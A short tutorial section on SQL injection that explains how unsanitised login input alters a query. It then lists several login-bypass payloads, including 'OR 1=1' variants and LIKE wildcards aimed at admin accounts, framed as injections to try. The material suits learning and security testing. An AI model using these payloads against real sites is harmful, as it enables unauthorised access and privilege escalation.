## SQL Injection
SQL makes queries into a database with statements like:
```sql
SELECT * FROM users WHERE username='chris' AND password='letmein';
```
This selects all entries from a database table where the username and password match those supplied.

If the user inputted data (the username and password entered in a login box, for example) is passed directly to this query, then what the user enters can manipulate the query.

The basic injection used for hacking the SQL is to enter `' OR 1=1; --` in the username box on the login screen and anything in the password, which would change the above select query to:
```sql
SELECT * FROM users WHERE username='' OR 1=1; -- ' AND password='letmein';
```
This injection first closes the single quote for the `username=''` part, then adds `OR 1=1` (`1=1` is always true in SQL) and then comments out the rest of the line using `--`, so the password has no effect. This updated query will return every row in the `users` table.

If the code checks that at least one row is returned, then this could give you entry to a site.

### Alternative injections to try
Some MySQL databases don't treat the `--` as a single line comment. Use:
```
' OR 1=1; #
```
Try without the semi-colon:
```
' OR 1=1 --
```
Quote the `1` digits:
```
' OR '1'='1' --
```
Use `LIKE` with the wildcard `%` to also match everything:
```
' OR username LIKE '%' --
```
Use `LIKE` with a specific username, which may give you elevated access, as the code may use a returned ID from the table to identify the logged in user:
```
' OR username LIKE 'admin' --
```
Or with a wildcard to get `admin`, `admins`, `administrator`, etc.:
```
' OR username LIKE 'adm%' --
```
